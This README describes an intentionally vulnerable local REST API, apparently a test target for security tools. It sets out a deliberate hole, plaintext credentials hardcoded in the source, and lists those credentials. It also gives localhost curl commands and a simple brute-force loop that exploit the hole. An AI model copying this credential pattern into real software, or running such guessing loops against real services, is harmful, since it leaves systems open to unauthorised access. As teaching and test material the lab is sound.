# API Credentials - Vulnerable Version

Simple REST API with hardcoded plaintext credentials for testing security tools.

## Setup

```bash
docker-compose up -d
```

The API will be available at `http://localhost:8005`

## Vulnerabilities

### Hardcoded Plaintext Credentials

Credentials are stored directly in the source code as plaintext:

```python
API_CREDENTIALS = {
    "admin": "admin123",
    "user": "password123",
    "service": "secretKey2024"
}
```

**Location**: `app/app.py` lines 7-11

**Impact**: Anyone with access to the source code can retrieve valid credentials.

## API Endpoints

### Public Endpoints
- `GET /` - API information
- `GET /api/status` - Service status

### Protected Endpoints (require HTTP Basic Auth)
- `GET /api/data` - Retrieve data items
- `GET /api/config` - Retrieve configuration (includes sensitive information)

## Exploitation Examples

### Using curl with valid credentials

```bash
# Test with admin user
curl -u admin:admin123 http://localhost:8005/api/data

# Test with regular user
curl -u user:password123 http://localhost:8005/api/data

# Get configuration (admin only for full permissions)
curl -u admin:admin123 http://localhost:8005/api/config
```

### Brute Force Attack

Since credentials are weak and limited, they can be easily brute-forced:

```bash
# Common password list attack
for user in admin user service; do
  for pass in admin123 password123 secretKey2024; do
    curl -s -u $user:$pass http://localhost:8005/api/data && echo "Found: $user:$pass"
  done
done
```

## Valid Credentials

- Username: `admin`, Password: `admin123`
- Username: `user`, Password: `password123`
- Username: `service`, Password: `secretKey2024`

